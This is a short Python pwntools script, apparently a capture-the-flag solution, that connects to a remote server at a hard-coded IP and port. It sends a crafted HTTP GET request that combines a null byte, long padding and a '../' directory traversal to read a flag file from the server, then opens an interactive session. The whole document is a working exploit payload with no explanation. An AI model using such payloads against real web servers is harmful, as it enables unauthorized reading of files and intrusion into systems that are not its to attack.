from pwn import * 

# context.log_level = 'debug'

p = remote("76.74.170.193", 9006)
# p = process('./tthttpd')

pay = 'GET //\x00'+'a'*0x7f0+'aaaaaaaaa../../../../../../../home/pwn/flag.txt\x00'
pay += '\r\n'
pay += 'connection: keep-alive'
pay += '\r\n\r\n'

# pause()
p.send(pay)

p.interactive()
